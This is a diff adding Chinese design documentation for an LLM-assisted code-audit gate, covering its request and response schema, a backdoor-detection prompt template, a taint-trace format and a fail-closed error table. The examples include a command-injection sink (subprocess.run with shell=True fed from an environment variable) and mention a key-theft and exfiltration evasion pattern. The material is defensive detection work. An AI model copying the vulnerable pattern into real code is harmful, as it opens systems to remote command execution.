+    Explanation          string  `json:"explanation"`          // 一句话权威裁决理由 (中文)
+    SuggestedRemediation string  `json:"suggestedRemediation"` // 针对性修复消除建议
+    ReasoningChain       string  `json:"reasoningChain,omitempty"`
+}</code></pre>
+            </div>
           </div>
+
+          <!-- 真实报文样例展示 -->
+          <div style="margin-top: 16px;">
+            <h4 style="margin: 0 0 10px 0; font-size: 14.5px;">📋 真实注入 CPG 污点轨迹的 Request 报文范例 (Wire JSON)</h4>
+            <pre class="codebox" style="font-size: 11.5px; background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px; overflow-x: auto;"><code>{
+  "protocolVersion": "teellm-protocol/v1",
+  "requestId": "verify-1726823456789000",
+  "timestamp": 1726823456,
+  "action": "VERIFY_FINDING",
+  "modelRef": {
+    "name": "qwen2.5-coder-7b-instruct",
+    "minContextTokens": 4096
+  },
+  "policy": {
+    "mode": "gate"
+  },
+  "findingPayload": {
+    "ruleId": "CMD_001",
+    "category": "命令执行",
+    "severity": "HIGH",
+    "description": "shell 命令执行或危险外部命令 — 可能绕过参数化保护",
+    "target": {
+      "filePath": "service_b/executor.py",
+      "line": 48,
+      "codeSnippet": "subprocess.run(cmd, shell=True)",
+      "contextBefore": "[Cross-File Sliced Context]\n# service_b/app.py:15\n@app.post(\"/v1/telemetry\")\ndef handle_telemetry():\n    data = request.get_json()\n    execute_command(data['cmd'])\n\n# service_b/executor.py:42\ndef execute_command(cmd):\n    logger.info(\"executing task\")\n    subprocess.run(cmd, shell=True)",
+      "contextAfter": "[Deep Audit Inter-Procedural Taint Trajectory]\nSource: ENV_001 (os.environ['TASK_CMD']) in service_a/loader.py:12\n  ↳ [DFG_DEF_USE] task_cmd = os.environ['TASK_CMD'] (L12)\n  ↳ [CALL_ARG] send_telemetry(payload) in service_a/client.py:28\n  ↳ [MICROSERVICE_HTTP] POST http://sidecar:8080/v1/telemetry in service_a/client.py:30\n  ↳ [MICROSERVICE_ROUTE] @app.post(\"/v1/telemetry\") in service_b/app.py:15\n  ↳ [CALL_ARG] execute_command(req.json['cmd']) in service_b/executor.py:45\n  ↳ [SINK: CMD_001] subprocess.run(cmd, shell=True) in service_b/executor.py:48"
+    }
+  }
+}</code></pre>
+          </div>
+
+          <!-- 真实响应样例展示 -->
+          <div class="spec-grid" style="grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 14px;">
+            <div class="card" style="background: var(--panel-2); border: 1px solid color-mix(in srgb, var(--danger, #ef4444) 40%, var(--line)); border-radius: 10px; padding: 14px;">
+              <h5 style="margin: 0 0 6px 0; font-size: 13px; color: var(--danger, #ef4444);">范例 A：确认为高危攻击后门 (MALICIOUS 拦截)</h5>
+              <pre class="codebox" style="margin: 0; font-size: 11px;"><code>{
+  "protocolVersion": "teellm-protocol/v1",
+  "requestId": "verify-1726823456789000",
+  "status": "SUCCESS",
+  "decision": {
+    "verdict": "MALICIOUS",
+    "confidence": 0.98,
+    "riskLevel": "CRITICAL",
+    "reasonCode": "CROSS_SERVICE_RCE_EXFILTRATION",
+    "explanation": "CPG 证实环境变量恶意指令跨微服务穿透并在执行器中通过 shell=True 触发未授权命令执行",
+    "suggestedRemediation": "移除 shell=True，严禁跨微服务透传执行非授信环境变量命令"
+  },
+  "metrics": { "latencyMs": 84, "promptTokens": 286, "completionTokens": 54 }
+}</code></pre>
+            </div>
+
+            <div class="card" style="background: var(--panel-2); border: 1px solid color-mix(in srgb, var(--ok) 40%, var(--line)); border-radius: 10px; padding: 14px;">
+              <h5 style="margin: 0 0 6px 0; font-size: 13px; color: var(--ok);">范例 B：良性科研逻辑消解误报 (BENIGN 降级放行)</h5>
+              <pre class="codebox" style="margin: 0; font-size: 11px;"><code>{
+  "protocolVersion": "teellm-protocol/v1",
+  "requestId": "verify-1726823456789001",
+  "status": "SUCCESS",
+  "decision": {
+    "verdict": "BENIGN",
+    "confidence": 0.96,
+    "riskLevel": "LOW",
+    "reasonCode": "BENIGN_METRICS_EXPORT",
+    "explanation": "代码仅为模型验证阶段 ROC 曲线与准确率标量的正常日志输出，未夹带原始训练数据",
+    "suggestedRemediation": "无需修复，代码符合模型安全规范"
+  },
+  "metrics": { "latencyMs": 62, "promptTokens": 210, "completionTokens": 42 }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3.3 File 级宏观攻击链研判契约 -->
+        <div style="margin-top: 32px;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+            <span style="background: var(--warn); color: #fff; font-weight: 800; padding: 3px 9px; border-radius: 6px; font-size: 12px;">3.3 File 契约</span>
+            <h3 style="margin: 0; font-size: 17px;">File 级宏观攻击链研判契约 (Action: ANALYZE_FILE)</h3>
+          </div>
+          <p style="font-size: 13.5px; line-height: 1.6; color: var(--text);">
+            除了单点代码审判外，攻击者常通过“前文读密钥、中途 base64 混淆、尾部 socket/HTTP 发送”的分段策略绕过单点检测。为此，TAA 编排器在文件内命中的所有规则去重后，按文件独立调用 <strong>File 级攻击链研判契约</strong>，输入文件宏观前 80 行代码与命中摘要，输出强类型攻击链布尔判定。
+          </p>
+
+          <div class="spec-grid" style="grid-template-columns: 1.2fr 1fr; gap: 16px; margin-top: 14px;">
+            <!-- Prompt 模板结构 -->
+            <div class="card" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 16px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 14px;">File 级提示词模板 (fileAnalysisPromptTemplate)</h4>
+              <pre class="codebox" style="margin: 0; font-size: 11px; max-height: 280px; overflow-y: auto;"><code>你是一个严谨的代码安全审计专家，请分析以下 Python 代码文件是否存在恶意后门、敏感数据外传或攻击行为。
+
+## 文件信息
+文件: %s (共 %d 行)
+静态规则扫描提示 (%d 处需确认点): %s
+
+## 文件内容（节选）
+```python
+%s
+```
+
+## 判定基准
+1. 正常的模型构建、前向推理、反向传播、权重保存、性能指标计算与打印（如 acc、auc、loss、dataset 标签与分隔符等）、训练结果导出（如混淆矩阵、ROC 曲线等）属于良性科研与训练逻辑，风险等级为 LOW，chained 为 false，exfiltration 为 false。
+2. 只有当代码中确凿存在未经授权的网络外发、系统后门、动态恶意执行或将敏感原始数据伪装外传时，才可判定 risk_level 为 HIGH/MEDIUM，并标记 chained 或 exfiltration 为 true。
+3. 严禁将常规的模型评估、指标打印或数据集名称输出误判为数据外传或攻击链。
+
+## 请严格按以下 JSON 格式输出，不要包含其他内容:
+{"risk_level":"HIGH/MEDIUM/LOW","summary":"一句话安全结论(中文)","chained":false,"exfiltration":false}</code></pre>
+            </div>
+
+            <!-- 输出约束与结构 -->
+            <div class="card" style="background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 16px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 14px;">File 级输出强类型 Schema 与联动规则</h4>
+              <ul style="margin: 0; padding-left: 18px; font-size: 12.5px; line-height: 1.6;">
+                <li><code>risk_level</code>：<code>HIGH</code> / <code>MEDIUM</code> / <code>LOW</code> / <code>UNCERTAIN</code>。</li>
+                <li><code>summary</code>：一句话权威中文安全研判结论。</li>
+                <li><code>chained</code> (bool)：是否存在多规则串联协同的复合攻击链。</li>
+                <li><code>exfiltration</code> (bool)：是否存在数据隐蔽通道外传特征。</li>
+                <li style="color: var(--danger, #ef4444); font-weight: 700; margin-top: 6px;">门禁联动裁决：</li>
+                <li>若 <code>chained == true</code> 或 <code>exfiltration == true</code>，编排器直接强制提升全局报告风险等级至 CRITICAL，触发 Gate 门禁严格拦截！</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3.4 CPG 深度因果证据链规范与注入机制 -->
+        <div style="margin-top: 32px;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+            <span style="background: #8b5cf6; color: #fff; font-weight: 800; padding: 3px 9px; border-radius: 6px; font-size: 12px;">3.4 证据规范</span>
+            <h3 style="margin: 0; font-size: 17px;">CPG 深度因果证据链规范与跳步注入机制</h3>
+          </div>
+          <p style="font-size: 13.5px; line-height: 1.6; color: var(--text);">
+            在 <code>internal/codeaudit/verifier.go</code> 中，Go 审计引擎检查每个 Finding 的 <code>f.CPGEvidence</code> 字段。当存在跨文件调用或微服务穿透时，<code>CPGEvidence</code> 自动替换传统的单行 <code>ContextAfter</code>，直接注入结构化的 <code>[Deep Audit Inter-Procedural Taint Trajectory]</code>。同时在 Go 内部通过 <code>TaintStep</code> 数组记录结构化跃迁元数据，支持下游报表直接序列化。
+          </p>
+
+          <div class="spec-grid" style="grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 14px;">
+            <div class="card" style="background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 13.5px; color: var(--accent);">树形轨迹注入语法 (ContextAfter)</h4>
+              <pre class="codebox" style="margin: 0; font-size: 11px; line-height: 1.5;"><code>[Deep Audit Inter-Procedural Taint Trajectory]
+Source: ENV_001 (os.environ['API_KEY']) in service_a/loader.py:12
+  ↳ [DFG_DEF_USE] api_key = os.environ['API_KEY'] (L12)
+  ↳ [CALL_ARG] send_telemetry(payload) in service_a/client.py:28
+  ↳ [MICROSERVICE_HTTP] POST http://sidecar:8080/v1/telemetry in service_a/client.py:30
+  ↳ [MICROSERVICE_ROUTE] @app.post("/v1/telemetry") in service_b/app.py:15
+  ↳ [CALL_ARG] execute_command(req.json['cmd']) in service_b/executor.py:45
+  ↳ [SINK: CMD_001] subprocess.run(cmd, shell=True) in service_b/executor.py:48</code></pre>
+            </div>
+
+            <div class="card" style="background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px;">
+              <h4 style="margin: 0 0 8px 0; font-size: 13.5px; color: var(--accent);">Go 结构化元数据契约 (rules.go)</h4>
+              <pre class="codebox" style="margin: 0; font-size: 11px; line-height: 1.5;"><code>// TaintStep 结构化证据跳步
+type TaintStep struct {
+    Step           int    `json:"step"`
+    Type           string `json:"type"`           // SOURCE / CALL / HTTP / SINK
+    File           string `json:"file"`
+    Line           int    `json:"line"`
+    Code           string `json:"code"`
+    EnclosingScope string `json:"enclosing_scope,omitempty"`
+    EdgeType       string `json:"edge_type,omitempty"`       // CALL_ARG, DFG_DEF_USE...
+}
+
+// Finding 实体新增 CPG 深度审计字段
+type Finding struct {
+    IsCrossFile    bool        `json:"is_cross_file,omitempty"`
+    IsMicroservice bool        `json:"is_microservice,omitempty"`
+    CPGEvidence    string      `json:"cpg_evidence,omitempty"`
+    TaintTrace     []TaintStep `json:"taint_trace,omitempty"`
+}</code></pre>
+            </div>
+          </div>
+        </div>
+
+        <!-- 3.5 故障降级与 Fail-Closed 状态机矩阵 -->
+        <div style="margin-top: 32px;">
+          <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+            <span style="background: var(--danger, #ef4444); color: #fff; font-weight: 800; padding: 3px 9px; border-radius: 6px; font-size: 12px;">3.5 故障熔断</span>
+            <h3 style="margin: 0; font-size: 17px;">故障降级与 Fail-Closed 安全状态机矩阵</h3>
+          </div>
+          <p style="font-size: 13.5px; line-height: 1.6; color: var(--text);">
+            任何安全架构必须预设“大模型不可用或遭受对抗扰动”的最坏场景。TAA 严格贯彻 <strong>Fail-Closed</strong> 准则：任何网络超时、断连、熔断器开启（Circuit Breaker Open）或模型输出损坏，绝不放行！
+          </p>
+
+          <table class="table" style="margin-top: 14px; font-size: 12px;">
+            <thead>
+              <tr>
+                <th style="width: 180px;">运行异常场景</th>
+                <th style="width: 140px;">错误码 / 触发条件</th>
+                <th style="width: 180px;">teellm 状态与理由</th>
+                <th style="width: 130px;">LLMDegraded</th>
+                <th>Gate 门禁最终裁决 (policy: gate)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>TEE 推理网络超时</strong></td>
+                <td><code>ctx.DeadlineExceeded</code></td>
+                <td><code>UNCERTAIN</code> · context deadline exceeded</td>
+                <td><span class="badge warn" style="padding: 1px 6px;">true</span></td>
+                <td><strong style="color: var(--danger, #ef4444);">强制阻断 (Passed: false)</strong> · 维持静态 HIGH/MEDIUM 风险</td>
+              </tr>
+              <tr>
+                <td><strong>熔断器开启 (Circuit Open)</strong></td>
+                <td><code>teellm.ErrCircuitOpen</code></td>
+                <td><code>UNCERTAIN</code> · circuit breaker open</td>
+                <td><span class="badge warn" style="padding: 1px 6px;">true</span></td>
+                <td><strong style="color: var(--danger, #ef4444);">强制阻断 (Passed: false)</strong> · 自动切入静态兜底安全门禁</td>
+              </tr>
+              <tr>
+                <td><strong>JSON 格式损坏 / 解析失败</strong></td>
+                <td>Non-JSON Output</td>
+                <td><code>UNCERTAIN</code> · empty decision payload</td>
+                <td><span class="badge warn" style="padding: 1px 6px;">true</span></td>
+                <td><strong style="color: var(--danger, #ef4444);">强制阻断 (Passed: false)</strong> · 拒绝猜想推断，安全底线不穿透</td>
+              </tr>
+              <tr>
+                <td><strong>未配置推理后端 / 飞地崩溃</strong></td>
+                <td>Connection Refused</td>
+                <td><code>UNCERTAIN</code> · connection refused</td>
+                <td><span class="badge warn" style="padding: 1px 6px;">true</span></td>
+                <td><strong style="color: var(--danger, #ef4444);">强制阻断 (Passed: false)</strong> · 阻断非受控模型导入</td>
+              </tr>
+              <tr>
+                <td><strong>模型确证为良性代码</strong></td>
+                <td>Verdict: BENIGN</td>
+                <td><code>BENIGN</code> · 确认为科研正常逻辑</td>
+                <td><span class="badge ok" style="padding: 1px 6px;">false</span></td>
+                <td><strong style="color: var(--ok);">放行准入 (Passed: true)</strong> · 成功消除静态误报点</td>
+              </tr>
+            </tbody>
+          </table>
         </div>
       </section>
 
